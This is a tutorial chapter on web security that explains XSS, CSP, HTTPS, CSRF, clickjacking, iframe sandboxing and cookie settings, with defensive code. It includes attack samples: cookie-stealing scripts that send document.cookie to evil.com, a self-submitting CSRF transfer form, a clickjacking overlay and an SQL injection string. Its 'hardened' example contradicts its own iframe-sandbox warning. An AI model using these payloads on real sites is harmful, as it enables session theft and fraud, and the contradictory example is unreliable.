# Chapter 13: Security Best Practices - In-Depth Explanation

## Introduction: Why Security Matters

**Web security protects:**
- User data and privacy
- Your reputation and brand
- Financial information
- Legal compliance
- Business operations

**The Stakes:**
- Average data breach costs $4.45 million (2023)
- 43% of cyber attacks target small businesses
- 95% of breaches are due to human error
- GDPR fines can reach ‚Ç¨20 million or 4% of revenue

**This chapter covers essential HTML security practices.**

---

## 13.1 XSS (Cross-Site Scripting) Prevention

**XSS is the #1 web security vulnerability.**

### What is XSS?

**Definition:** Injecting malicious scripts into trusted websites.

**How it works:**

```
1. Attacker finds input field (comment, search, profile)
2. Injects malicious script
3. Website stores/displays the script
4. Other users' browsers execute the malicious script
5. Attacker steals data, hijacks sessions, etc.
```

---

### Types of XSS Attacks

**1. Stored XSS (Persistent)**

Most dangerous - stored in database.

```html
<!-- User submits this comment: -->
<script>
  // Steal cookies
  fetch('https://evil.com/steal?cookie=' + document.cookie);
</script>

<!-- Website stores it in database -->
<!-- Every user who views the comment runs this script! -->
```

**Example Attack:**

```html
<!-- Comment form -->
<form action="/submit-comment" method="POST">
  <textarea name="comment"></textarea>
  <button>Submit</button>
</form>

<!-- Attacker enters: -->
<script>alert('XSS!')</script>

<!-- If not sanitized, stored in database -->
<!-- Display on page: -->
<div class="comment">
  <script>alert('XSS!')</script>  <!-- EXECUTES! -->
</div>
```

---

**2. Reflected XSS (Non-Persistent)**

Script in URL, reflected in page.

```html
<!-- Search page URL: -->
https://example.com/search?q=<script>alert('XSS')</script>

<!-- If page displays search query unsanitized: -->
<div>
  You searched for: <script>alert('XSS')</script>  <!-- EXECUTES! -->
</div>
```

**Real Attack:**

```html
<!-- Attacker sends victim this link: -->
https://example.com/search?q=<script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>

<!-- Victim clicks link, their cookies are stolen! -->
```

---

**3. DOM-Based XSS**

Script manipulates DOM directly.

```html
<!-- Vulnerable code: -->
<script>
  const name = new URLSearchParams(window.location.search).get('name');
  document.getElementById('greeting').innerHTML = 'Hello ' + name;
</script>

<!-- Attacker's URL: -->
https://example.com/?name=<img src=x onerror=alert('XSS')>

<!-- Result: -->
<div id="greeting">
  Hello <img src=x onerror=alert('XSS')>  <!-- EXECUTES! -->
</div>
```

---

### Preventing XSS

**Golden Rule: NEVER trust user input!**

**1. Escape/Sanitize Output**

```html
<!-- ‚ùå DANGEROUS: Directly inserting user input -->
<div>
  <?php echo $_GET['comment']; ?>  <!-- Server-side -->
</div>

<script>
  div.innerHTML = userInput;  // JavaScript
</script>

<!-- ‚úÖ SAFE: Escape HTML -->
<div>
  <?php echo htmlspecialchars($_GET['comment']); ?>
</div>

<script>
  div.textContent = userInput;  // textContent, not innerHTML
</script>
```

**JavaScript Sanitization:**

```javascript
// ‚ùå DANGEROUS: innerHTML with user input
function displayComment(comment) {
  document.getElementById('comment').innerHTML = comment;
}

// ‚úÖ SAFE: textContent (no HTML execution)
function displayComment(comment) {
  document.getElementById('comment').textContent = comment;
}

// ‚úÖ SAFE: Escape HTML before using innerHTML
function escapeHtml(unsafe) {
  return unsafe
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#039;");
}

function displayComment(comment) {
  document.getElementById('comment').innerHTML = escapeHtml(comment);
}
```

---

**2. Use Content Security Policy (CSP)**

See section 13.2 below.

---

**3. Validate and Sanitize Input**

```javascript
// ‚ùå Accept anything
function saveComment(comment) {
  database.save(comment);
}

// ‚úÖ Validate and sanitize
function saveComment(comment) {
  // Validation
  if (comment.length > 1000) {
    throw new Error('Comment too long');
  }
  
  // Sanitize (remove script tags, etc.)
  const sanitized = sanitizeHtml(comment);
  
  database.save(sanitized);
}
```

---

**4. Use Framework Protection**

```javascript
// React (safe by default - escapes by default)
function Comment({ text }) {
  return <div>{text}</div>;  // ‚úÖ Escaped automatically
}

// React (dangerous - bypass escaping)
function Comment({ html }) {
  return <div dangerouslySetInnerHTML={{__html: html}} />;  // ‚ùå Only if you trust the source!
}

// Vue.js (safe by default)
<div>{{ userInput }}</div>  <!-- ‚úÖ Escaped -->
<div v-html="userInput"></div>  <!-- ‚ùå Dangerous! -->

// Angular (safe by default)
<div>{{ userInput }}</div>  <!-- ‚úÖ Escaped -->
<div [innerHTML]="userInput"></div>  <!-- ‚ùå Dangerous! -->
```

---

### Complete XSS Prevention Example

```html
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>XSS Prevention Demo</title>
  
  <!-- Content Security Policy (prevents inline scripts) -->
  <meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self';">
  
  <style>
    body {
      font-family: Arial, sans-serif;
      max-width: 800px;
      margin: 40px auto;
      padding: 20px;
    }
    
    .demo {
      background: #f5f5f5;
      padding: 20px;
      margin: 20px 0;
      border-radius: 8px;
    }
    
    .vulnerable {
      border: 3px solid #dc3545;
    }
    
    .safe {
      border: 3px solid #28a745;
    }
    
    textarea {
      width: 100%;
      padding: 10px;
      margin: 10px 0;
      border: 1px solid #ddd;
      border-radius: 4px;
    }
    
    button {
      padding: 10px 20px;
      background: #0066cc;
      color: white;
      border: none;
      border-radius: 4px;
      cursor: pointer;
    }
    
    .output {
      background: white;
      padding: 15px;
      margin-top: 10px;
      border: 1px solid #ddd;
      border-radius: 4px;
      min-height: 50px;
    }
  </style>
</head>
<body>
  <h1>XSS Prevention Examples</h1>
  
  <!-- Vulnerable Example -->
  <div class="demo vulnerable">
    <h2>‚ùå VULNERABLE: innerHTML (Don't use in production!)</h2>
    <textarea id="vulnerable-input" placeholder="Try entering: &lt;script&gt;alert('XSS')&lt;/script&gt;"></textarea>
    <button onclick="displayVulnerable()">Display (Vulnerable)</button>
    <div class="output" id="vulnerable-output"></div>
    <p><strong>Warning:</strong> This demonstrates a vulnerability. Never use innerHTML with user input!</p>
  </div>
  
  <!-- Safe Example -->
  <div class="demo safe">
    <h2>‚úÖ SAFE: textContent (Always use this!)</h2>
    <textarea id="safe-input" placeholder="Try entering: &lt;script&gt;alert('XSS')&lt;/script&gt;"></textarea>
    <button onclick="displaySafe()">Display (Safe)</button>
    <div class="output" id="safe-output"></div>
    <p><strong>Result:</strong> HTML is escaped and displayed as text, not executed.</p>
  </div>
  
  <!-- Escaped HTML Example -->
  <div class="demo safe">
    <h2>‚úÖ SAFE: Escaped HTML</h2>
    <textarea id="escaped-input" placeholder="Try entering HTML"></textarea>
    <button onclick="displayEscaped()">Display (Escaped)</button>
    <div class="output" id="escaped-output"></div>
    <p><strong>Result:</strong> HTML is escaped before using innerHTML.</p>
  </div>
  
  <script>
    // ‚ùå VULNERABLE: Never do this!
    function displayVulnerable() {
      const input = document.getElementById('vulnerable-input').value;
      document.getElementById('vulnerable-output').innerHTML = input;
      // Malicious scripts will execute!
    }
    
    // ‚úÖ SAFE: Use textContent
    function displaySafe() {
      const input = document.getElementById('safe-input').value;
      document.getElementById('safe-output').textContent = input;
      // HTML is displayed as text, not executed
    }
    
    // ‚úÖ SAFE: Escape HTML before using innerHTML
    function displayEscaped() {
      const input = document.getElementById('escaped-input').value;
      const escaped = escapeHtml(input);
      document.getElementById('escaped-output').innerHTML = escaped;
    }
    
    // Escape HTML special characters
    function escapeHtml(unsafe) {
      return unsafe
        .replace(/&/g, "&amp;")
        .replace(/</g, "&lt;")
        .replace(/>/g, "&gt;")
        .replace(/"/g, "&quot;")
        .replace(/'/g, "&#039;");
    }
  </script>
</body>
</html>
```

---

## 13.2 Content Security Policy (CSP)

**CSP is a powerful defense against XSS attacks.**

### What is CSP?

**Definition:** Security layer that helps detect and mitigate XSS and data injection attacks.

**How it works:** Whitelist approved sources for content.

---

### Basic CSP Implementation

**Method 1: HTTP Header (Recommended)**

```
Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted-cdn.com;
```

**Method 2: Meta Tag**

```html
<meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self';">
```

---

### CSP Directives

```html
<meta http-equiv="Content-Security-Policy" content="
  default-src 'self';
  script-src 'self' https://cdn.example.com;
  style-src 'self' 'unsafe-inline';
  img-src 'self' data: https:;
  font-src 'self' https://fonts.gstatic.com;
  connect-src 'self' https://api.example.com;
  frame-src 'none';
  object-src 'none';
  base-uri 'self';
  form-action 'self';
">
```

**Directive Explanations:**

```html
<!-- default-src: Fallback for all resource types -->
default-src 'self'
<!-- Only load resources from same origin -->

<!-- script-src: JavaScript sources -->
script-src 'self' https://cdn.example.com
<!-- Scripts only from same origin and cdn.example.com -->

<!-- style-src: CSS sources -->
style-src 'self' 'unsafe-inline'
<!-- CSS from same origin + allow inline styles -->

<!-- img-src: Image sources -->
img-src 'self' data: https:
<!-- Images from same origin, data URLs, and any HTTPS -->

<!-- font-src: Font sources -->
font-src 'self' https://fonts.gstatic.com
<!-- Fonts from same origin and Google Fonts -->

<!-- connect-src: fetch, XHR, WebSocket sources -->
connect-src 'self' https://api.example.com
<!-- API calls only to same origin and api.example.com -->

<!-- frame-src: iframe sources -->
frame-src 'none'
<!-- No iframes allowed -->

<!-- object-src: <object>, <embed> sources -->
object-src 'none'
<!-- No Flash/plugins allowed -->

<!-- base-uri: <base> tag URLs -->
base-uri 'self'
<!-- Base tag only from same origin -->

<!-- form-action: Form submission targets -->
form-action 'self'
<!-- Forms only submit to same origin -->
```

---

### CSP Source Values

```html
<!-- 'self': Same origin only -->
script-src 'self'

<!-- 'none': Block all -->
object-src 'none'

<!-- Specific domain -->
script-src https://cdn.example.com

<!-- Any HTTPS -->
img-src https:

<!-- Data URLs -->
img-src data:

<!-- 'unsafe-inline': Allow inline scripts/styles (avoid!) -->
script-src 'self' 'unsafe-inline'  <!-- ‚ùå Defeats purpose of CSP -->

<!-- 'unsafe-eval': Allow eval() (avoid!) -->
script-src 'self' 'unsafe-eval'  <!-- ‚ùå Dangerous -->

<!-- Nonce (random value) -->
script-src 'nonce-abc123'

<!-- Hash -->
script-src 'sha256-abc123...'
```

---

### CSP Examples by Use Case

**Strict CSP (Most Secure):**

```html
<meta http-equiv="Content-Security-Policy" content="
  default-src 'none';
  script-src 'self';
  style-src 'self';
  img-src 'self';
  font-src 'self';
  connect-src 'self';
  frame-ancestors 'none';
">
```

**Moderate CSP (Common):**

```html
<meta http-equiv="Content-Security-Policy" content="
  default-src 'self';
  script-src 'self' https://cdn.jsdelivr.net;
  style-src 'self' 'unsafe-inline';
  img-src 'self' https: data:;
  font-src 'self' https://fonts.gstatic.com;
">
```

**CSP with Google Fonts and Analytics:**

```html
<meta http-equiv="Content-Security-Policy" content="
  default-src 'self';
  script-src 'self' https://www.google-analytics.com;
  style-src 'self' https://fonts.googleapis.com;
  font-src 'self' https://fonts.gstatic.com;
  img-src 'self' https: data:;
  connect-src 'self' https://www.google-analytics.com;
">
```

---

### Using Nonces for Inline Scripts

**Problem:** CSP blocks inline scripts by default (good!), but sometimes you need them.

**Solution:** Use nonces (random values).

```html
<head>
  <!-- CSP with nonce -->
  <meta http-equiv="Content-Security-Policy" content="
    script-src 'self' 'nonce-randomvalue123';
  ">
  
  <!-- Inline script with matching nonce -->
  <script nonce="randomvalue123">
    console.log('This script is allowed');
  </script>
  
  <!-- Inline script without nonce -->
  <script>
    console.log('This script is BLOCKED');
  </script>
</head>
```

**Server-Side Nonce Generation (Node.js example):**

```javascript
// Generate random nonce
const crypto = require('crypto');
const nonce = crypto.randomBytes(16).toString('base64');

// Add to CSP header
response.setHeader(
  'Content-Security-Policy',
  `script-src 'self' 'nonce-${nonce}'`
);

// Add to inline scripts
const html = `
  <script nonce="${nonce}">
    console.log('Allowed script');
  </script>
`;
```

---

### CSP Reporting

**Monitor CSP violations.**

```html
<meta http-equiv="Content-Security-Policy" content="
  default-src 'self';
  script-src 'self';
  report-uri /csp-violation-report;
">
```

**Violation Report (JSON):**

```json
{
  "csp-report": {
    "document-uri": "https://example.com/page",
    "violated-directive": "script-src 'self'",
    "blocked-uri": "https://evil.com/malicious.js",
    "line-number": 23,
    "source-file": "https://example.com/page"
  }
}
```

**Report-Only Mode (Testing):**

```html
<!-- Test CSP without breaking site -->
<meta http-equiv="Content-Security-Policy-Report-Only" content="
  default-src 'self';
  report-uri /csp-report;
">
<!-- Violations reported but not blocked -->
```

---

## 13.3 HTTPS - Secure Connections

**HTTPS encrypts data between browser and server.**

### Why HTTPS is Essential

**Without HTTPS (HTTP):**
```
User ‚îÄ‚îÄ[Plain Text]‚îÄ‚îÄ> Server
         ‚Üë
    Anyone can read:
    - Passwords
    - Credit cards
    - Personal data
```

**With HTTPS:**
```
User ‚îÄ‚îÄ[Encrypted]‚îÄ‚îÄ> Server
         ‚Üë
    Encrypted - unreadable
    to attackers
```

---

### Forcing HTTPS

**1. Redirect HTTP to HTTPS**

```apache
# Apache .htaccess
RewriteEngine On
RewriteCond %{HTTPS} off
RewriteRule ^(.*)$ https://%{HTTP_HOST}%{REQUEST_URI} [L,R=301]
```

**2. HSTS (HTTP Strict Transport Security)**

```html
<!-- Meta tag (limited support) -->
<meta http-equiv="Strict-Transport-Security" content="max-age=31536000; includeSubDomains">
```

**Server Header (Preferred):**
```
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
```

**What HSTS does:**
- Forces HTTPS for all future visits
- Prevents downgrade attacks
- `max-age`: How long to enforce (seconds)
- `includeSubDomains`: Apply to all subdomains
- `preload`: Submit to browser preload list

---

### Mixed Content

**Problem:** HTTPS page loading HTTP resources.

```html
<!-- ‚ùå MIXED CONTENT: HTTPS page loading HTTP image -->
<!-- URL: https://example.com/page -->
<img src="http://example.com/photo.jpg" alt="Photo">
<!-- Browser blocks this! -->

<!-- ‚úÖ FIX: Use HTTPS or protocol-relative URLs -->
<img src="https://example.com/photo.jpg" alt="Photo">

<!-- ‚úÖ ALTERNATIVE: Protocol-relative -->
<img src="//example.com/photo.jpg" alt="Photo">
<!-- Uses same protocol as page (http or https) -->
```

**Check for Mixed Content:**
```
Chrome DevTools ‚Üí Console
Look for: "Mixed Content" warnings
```

---

## 13.4 Form Security

### CSRF (Cross-Site Request Forgery)

**Attack:** Trick user into submitting unwanted request.

**Example Attack:**

```html
<!-- Attacker's website: evil.com -->
<form action="https://bank.com/transfer" method="POST" id="hackForm">
  <input type="hidden" name="to" value="attacker-account">
  <input type="hidden" name="amount" value="1000">
</form>

<script>
  document.getElementById('hackForm').submit();
  // If user is logged into bank.com, money transfers!
</script>
```

**Visual Flow:**

```
1. User logs into bank.com (gets session cookie)
2. User visits evil.com (while still logged in)
3. evil.com submits form to bank.com
4. Browser includes session cookie (user is authenticated!)
5. Transfer succeeds - user's money is stolen!
```

---

### Preventing CSRF

**Solution: CSRF Tokens**

```html
<!-- Server generates unique token -->
<form action="/transfer" method="POST">
  <input type="hidden" name="csrf_token" value="abc123xyz789">
  
  <label for="amount">Amount:</label>
  <input type="number" id="amount" name="amount">
  
  <button type="submit">Transfer</button>
</form>
```

**How it works:**

```
1. Server generates random token per session/form
2. Token stored in session on server
3. Token included in form as hidden field
4. On submit, server validates token matches session
5. Attacker can't get the token (cross-origin security)
6. Form submission fails without valid token
```

**Server-Side Validation (Node.js example):**

```javascript
// Generate token
const crypto = require('crypto');
const csrfToken = crypto.randomBytes(32).toString('hex');
req.session.csrfToken = csrfToken;

// Validate on form submission
app.post('/transfer', (req, res) => {
  const submittedToken = req.body.csrf_token;
  const sessionToken = req.session.csrfToken;
  
  if (submittedToken !== sessionToken) {
    return res.status(403).send('CSRF token validation failed');
  }
  
  // Process form...
});
```

---

### Input Validation

**Never trust client-side validation alone!**

```html
<!-- ‚ùå Client-side only (can be bypassed) -->
<form action="/submit" method="POST">
  <input type="email" required>
  <button>Submit</button>
</form>
<!-- Attacker can bypass by editing HTML or using curl -->

<!-- ‚úÖ Client + Server validation -->
<form action="/submit" method="POST">
  <input type="email" required>
  <button>Submit</button>
</form>

<!-- Server-side (Node.js): -->
<script>
app.post('/submit', (req, res) => {
  const email = req.body.email;
  
  // Validate on server
  if (!isValidEmail(email)) {
    return res.status(400).send('Invalid email');
  }
  
  // Sanitize
  const sanitized = sanitizeEmail(email);
  
  // Process...
});
</script>
```

---

### SQL Injection Prevention

**Although not HTML-specific, important for forms.**

```javascript
// ‚ùå VULNERABLE: String concatenation
const query = "SELECT * FROM users WHERE username = '" + userInput + "'";
// Attacker enters: ' OR '1'='1
// Query becomes: SELECT * FROM users WHERE username = '' OR '1'='1'
// Returns all users!

// ‚úÖ SAFE: Parameterized queries
const query = "SELECT * FROM users WHERE username = ?";
db.execute(query, [userInput]);
```

---

### File Upload Security

```html
<form action="/upload" method="POST" enctype="multipart/form-data">
  <input type="file" name="photo" accept="image/*">
  <button>Upload</button>
</form>
```

**Security Measures:**

```javascript
// Server-side validation
app.post('/upload', upload.single('photo'), (req, res) => {
  const file = req.file;
  
  // 1. Validate file type (don't trust client!)
  const allowedTypes = ['image/jpeg', 'image/png', 'image/gif'];
  if (!allowedTypes.includes(file.mimetype)) {
    return res.status(400).send('Invalid file type');
  }
  
  // 2. Validate file size
  const maxSize = 5 * 1024 * 1024; // 5 MB
  if (file.size > maxSize) {
    return res.status(400).send('File too large');
  }
  
  // 3. Scan for malware (use antivirus)
  // scanFile(file.path);
  
  // 4. Rename file (don't use original name)
  const safeFilename = crypto.randomBytes(16).toString('hex') + '.jpg';
  
  // 5. Store outside web root if possible
  // Move to /uploads/ not /public/
  
  // 6. Sanitize metadata (EXIF data can contain scripts)
  // removeExifData(file);
});
```

**HTML Restrictions:**

```html
<!-- ‚úÖ Limit file types -->
<input type="file" accept="image/jpeg,image/png">

<!-- ‚úÖ Client-side size check (backup only!) -->
<input type="file" id="file" onchange="checkFileSize(this)">

<script>
  function checkFileSize(input) {
    if (input.files[0].size > 5 * 1024 * 1024) {
      alert('File must be less than 5MB');
      input.value = '';
    }
  }
</script>
```

---

## 13.5 Iframe Security

**Iframes can be security risks.**

### The `sandbox` Attribute

**Restricts what iframe can do.**

```html
<!-- ‚ùå DANGEROUS: No restrictions -->
<iframe src="https://untrusted-site.com"></iframe>

<!-- ‚úÖ SAFE: All restrictions -->
<iframe src="https://untrusted-site.com" sandbox></iframe>

<!-- ‚úÖ SAFE: Allow specific features -->
<iframe 
  src="https://untrusted-site.com" 
  sandbox="allow-scripts allow-same-origin"
></iframe>
```

---

### Sandbox Values

```html
<!-- allow-scripts: Allow JavaScript -->
<iframe sandbox="allow-scripts"></iframe>

<!-- allow-same-origin: Allow same-origin access -->
<iframe sandbox="allow-same-origin"></iframe>

<!-- allow-forms: Allow form submission -->
<iframe sandbox="allow-forms"></iframe>

<!-- allow-popups: Allow popups -->
<iframe sandbox="allow-popups"></iframe>

<!-- allow-top-navigation: Allow navigating parent window -->
<iframe sandbox="allow-top-navigation"></iframe>

<!-- Combined (most common) -->
<iframe sandbox="allow-scripts allow-same-origin"></iframe>
```

**‚ö†Ô∏è Warning:** `allow-scripts` + `allow-same-origin` together removes most sandbox protections!

```html
<!-- ‚ùå BAD: Both together (almost no protection) -->
<iframe sandbox="allow-scripts allow-same-origin"></iframe>

<!-- ‚úÖ BETTER: Scripts without same-origin -->
<iframe sandbox="allow-scripts"></iframe>

<!-- ‚úÖ BETTER: Same-origin without scripts -->
<iframe sandbox="allow-same-origin"></iframe>
```

---

### X-Frame-Options

**Prevent your site from being embedded in iframes (clickjacking protection).**

**Server Header:**
```
X-Frame-Options: DENY
X-Frame-Options: SAMEORIGIN
X-Frame-Options: ALLOW-FROM https://trusted.com
```

**Meta Tag (limited support):**
```html
<meta http-equiv="X-Frame-Options" content="DENY">
```

**Modern Alternative - CSP:**
```html
<meta http-equiv="Content-Security-Policy" content="frame-ancestors 'none';">
<!-- or -->
<meta http-equiv="Content-Security-Policy" content="frame-ancestors 'self';">
```

---

### Clickjacking Attack Example

**What is Clickjacking:**

```html
<!-- Attacker's page: evil.com -->
<style>
  iframe {
    opacity: 0;
    position: absolute;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
  }
</style>

<!-- Invisible iframe over attacker's content -->
<iframe src="https://bank.com/transfer"></iframe>

<!-- Visible decoy button -->
<button style="position: relative; z-index: -1;">
  Click for free prize!
</button>

<!-- User thinks they're clicking "free prize"
     Actually clicking invisible "transfer money" button! -->
```

**Prevention:**

```html
<!-- Your site: bank.com -->
<meta http-equiv="Content-Security-Policy" content="frame-ancestors 'none';">
<!-- Now can't be embedded in evil.com's iframe -->
```

---

## 13.6 Additional Security Practices

### Cookie Security

```html
<!-- Set secure cookies (server-side) -->
<script>
// ‚ùå INSECURE: Normal cookie
document.cookie = "session=abc123";

// ‚úÖ SECURE: httpOnly, secure, sameSite
// Set on server:
Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict; Max-Age=3600
</script>
```

**Cookie Attributes:**
- `HttpOnly` - Not accessible via JavaScript (prevents XSS)
- `Secure` - Only sent over HTTPS
- `SameSite=Strict` - Only sent in first-party context (prevents CSRF)
- `SameSite=Lax` - Sent on top-level navigation
- `SameSite=None` - Sent in all contexts (requires Secure)

---

### Disable Autocomplete for Sensitive Fields

```html
<!-- ‚úÖ Disable autocomplete for passwords (when appropriate) -->
<form autocomplete="off">
  <label for="cc-number">Credit Card:</label>
  <input 
    type="text" 
    id="cc-number"
    name="cc-number"
    autocomplete="off"
  >
  
  <label for="cvv">CVV:</label>
  <input 
    type="text" 
    id="cvv"
    name="cvv"
    autocomplete="off"
  >
</form>

<!-- ‚ùå Don't disable for login forms (bad UX) -->
<!-- ‚úÖ Use autocomplete values instead -->
<input type="email" autocomplete="email">
<input type="password" autocomplete="current-password">
```

---

### External Links Security

```html
<!-- ‚ùå VULNERABLE: target="_blank" without rel -->
<a href="https://external-site.com" target="_blank">
  External Link
</a>
<!-- External site can access window.opener -->

<!-- ‚úÖ SECURE: Add rel="noopener noreferrer" -->
<a 
  href="https://external-site.com" 
  target="_blank" 
  rel="noopener noreferrer"
>
  External Link
</a>

<!-- What each does: -->
<!-- noopener: Prevents window.opener access -->
<!-- noreferrer: Doesn't send referrer header -->
```

---

### Subresource Integrity (SRI)

**Verify CDN files haven't been tampered with.**

```html
<!-- ‚ùå Vulnerable: CDN could be compromised -->
<script src="https://cdn.example.com/library.js"></script>

<!-- ‚úÖ Secure: Verify with hash -->
<script 
  src="https://cdn.example.com/library.js"
  integrity="sha384-abc123..."
  crossorigin="anonymous"
></script>
```

**How to generate SRI hash:**

```bash
# Command line
openssl dgst -sha384 -binary library.js | openssl base64 -A

# Or use online tool: https://www.srihash.org/
```

**Example with Real Library:**

```html
<!-- jQuery from CDN with SRI -->
<script 
  src="https://code.jquery.com/jquery-3.6.0.min.js"
  integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4="
  crossorigin="anonymous"
></script>

<!-- Bootstrap CSS with SRI -->
<link 
  href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css"
  rel="stylesheet"
  integrity="sha384-9ndCyUa..."
  crossorigin="anonymous"
>
```

**What happens if file is modified:**
- Browser computes hash of downloaded file
- Compares with integrity hash
- If different: **Refuses to execute/load**
- Protects against CDN compromise

---

## Complete Security-Hardened Page

```html
<!DOCTYPE html>
<html lang="en">
<head>
  <!-- ================================================
       ESSENTIAL META TAGS
       ================================================ -->
  
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Security Hardened Website</title>
  <meta name="description" content="Example of a security-hardened HTML page">
  
  <!-- ================================================
       SECURITY HEADERS (via Meta Tags)
       ================================================ -->
  
  <!-- Content Security Policy -->
  <meta http-equiv="Content-Security-Policy" content="
    default-src 'self';
    script-src 'self' https://cdn.jsdelivr.net;
    style-src 'self' 'unsafe-inline';
    img-src 'self' https: data:;
    font-src 'self' https://fonts.gstatic.com;
    connect-src 'self' https://api.example.com;
    frame-ancestors 'none';
    base-uri 'self';
    form-action 'self';
    upgrade-insecure-requests;
  ">
  
  <!-- X-Frame-Options (Clickjacking Protection) -->
  <meta http-equiv="X-Frame-Options" content="DENY">
  
  <!-- Referrer Policy -->
  <meta name="referrer" content="strict-origin-when-cross-origin">
  
  <!-- ================================================
       RESOURCE HINTS (with security considerations)
       ================================================ -->
  
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  
  <!-- ================================================
       STYLES
       ================================================ -->
  
  <style>
    body {
      font-family: Arial, sans-serif;
      max-width: 800px;
      margin: 0 auto;
      padding: 20px;
    }
    
    .security-info {
      background: #d4edda;
      border: 1px solid #c3e6cb;
      padding: 15px;
      border-radius: 4px;
      margin: 20px 0;
    }
    
    form {
      background: #f5f5f5;
      padding: 20px;
      border-radius: 8px;
      margin: 20px 0;
    }
    
    .form-group {
      margin: 15px 0;
    }
    
    label {
      display: block;
      margin-bottom: 5px;
      font-weight: 600;
    }
    
    input, textarea {
      width: 100%;
      padding: 10px;
      border: 2px solid #ddd;
      border-radius: 4px;
    }
    
    button {
      padding: 12px 24px;
      background: #0066cc;
      color: white;
      border: none;
      border-radius: 4px;
      cursor: pointer;
      font-size: 16px;
    }
    
    button:hover {
      background: #0052a3;
    }
  </style>
  
  <!-- ================================================
       EXTERNAL SCRIPTS (with SRI)
       ================================================ -->
  
  <!-- jQuery with Subresource Integrity -->
  <script 
    src="https://code.jquery.com/jquery-3.6.0.min.js"
    integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4="
    crossorigin="anonymous"
    defer
  ></script>
</head>
<body>
  <h1>üîí Security-Hardened Website</h1>
  
  <div class="security-info">
    <h2>Security Features Enabled:</h2>
    <ul>
      <li>‚úÖ Content Security Policy (CSP)</li>
      <li>‚úÖ XSS Protection</li>
      <li>‚úÖ Clickjacking Prevention (X-Frame-Options)</li>
      <li>‚úÖ CSRF Token Protection</li>
      <li>‚úÖ Subresource Integrity (SRI)</li>
      <li>‚úÖ HTTPS Only (upgrade-insecure-requests)</li>
      <li>‚úÖ Secure External Links (rel="noopener noreferrer")</li>
      <li>‚úÖ Input Sanitization</li>
    </ul>
  </div>
  
  <!-- ================================================
       SECURE FORM EXAMPLE
       ================================================ -->
  
  <h2>Secure Contact Form</h2>
  
  <form action="/submit" method="POST" id="contactForm">
    <!-- CSRF Token (generated server-side) -->
    <input type="hidden" name="csrf_token" value="abc123xyz789">
    
    <div class="form-group">
      <label for="name">Name:</label>
      <input 
        type="text" 
        id="name" 
        name="name"
        maxlength="100"
        required
      >
    </div>
    
    <div class="form-group">
      <label for="email">Email:</label>
      <input 
        type="email" 
        id="email" 
        name="email"
        required
      >
    </div>
    
    <div class="form-group">
      <label for="message">Message:</label>
      <textarea 
        id="message" 
        name="message"
        rows="5"
        maxlength="1000"
        required
      ></textarea>
    </div>
    
    <button type="submit">Send Message</button>
  </form>
  
  <!-- ================================================
       SECURE EXTERNAL LINKS
       ================================================ -->
  
  <h2>External Resources</h2>
  
  <p>
    Visit our 
    <a 
      href="https://github.com/example" 
      target="_blank" 
      rel="noopener noreferrer"
    >
      GitHub repository
    </a>
    for source code.
  </p>
  
  <!-- ================================================
       SECURE IFRAME (if needed)
       ================================================ -->
  
  <h2>Embedded Content</h2>
  
  <iframe 
    src="https://trusted-site.com/embed"
    sandbox="allow-scripts allow-same-origin"
    title="Embedded content"
    width="600"
    height="400"
    loading="lazy"
  ></iframe>
  
  <!-- ================================================
       JAVASCRIPT (Secure Practices)
       ================================================ -->
  
  <script defer>
    // Wait for DOM
    document.addEventListener('DOMContentLoaded', () => {
      const form = document.getElementById('contactForm');
      
      form.addEventListener('submit', (e) => {
        e.preventDefault();
        
        // Get form data
        const formData = new FormData(form);
        
        // Client-side validation
        const name = formData.get('name');
        const email = formData.get('email');
        const message = formData.get('message');
        
        // Validate (basic checks)
        if (name.length < 2 || name.length > 100) {
          alert('Name must be 2-100 characters');
          return;
        }
        
        if (!isValidEmail(email)) {
          alert('Please enter a valid email');
          return;
        }
        
        if (message.length < 10 || message.length > 1000) {
          alert('Message must be 10-1000 characters');
          return;
        }
        
        // Submit to server (server validates again!)
        submitForm(formData);
      });
      
      function isValidEmail(email) {
        return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
      }
      
      function submitForm(formData) {
        fetch('/submit', {
          method: 'POST',
          body: formData,
          headers: {
            'X-Requested-With': 'XMLHttpRequest'
          }
        })
        .then(response => {
          if (!response.ok) {
            throw new Error('Submission failed');
          }
          return response.json();
        })
        .then(data => {
          alert('Form submitted successfully!');
          form.reset();
        })
        .catch(error => {
          alert('Error: ' + error.message);
        });
      }
    });
  </script>
</body>
</html>
```

---

## Security Checklist

### XSS Prevention ‚úì

```
‚úÖ Never use innerHTML with user input
‚úÖ Use textContent instead
‚úÖ Escape HTML entities before output
‚úÖ Implement Content Security Policy
‚úÖ Validate and sanitize all input
‚úÖ Use framework security features
‚úÖ Encode output based on context
```

---

### CSRF Prevention ‚úì

```
‚úÖ Use CSRF tokens in all forms
‚úÖ Validate tokens server-side
‚úÖ Use SameSite cookie attribute
‚úÖ Check Referer/Origin headers
‚úÖ Require re-authentication for sensitive actions
```

---

### General Security ‚úì

```
‚úÖ Use HTTPS everywhere (no HTTP)
‚úÖ Implement HSTS header
‚úÖ Keep dependencies updated
‚úÖ Validate input server-side (never trust client)
‚úÖ Use parameterized queries (prevent SQL injection)
‚úÖ Implement rate limiting
‚úÖ Log security events
‚úÖ Regular security audits
```

---

### Form Security ‚úì

```
‚úÖ CSRF tokens in all forms
‚úÖ Server-side validation always
‚úÖ Limit input length (maxlength)
‚úÖ Validate file uploads (type, size)
‚úÖ Use HTTPS for all forms
‚úÖ Disable autocomplete for sensitive fields
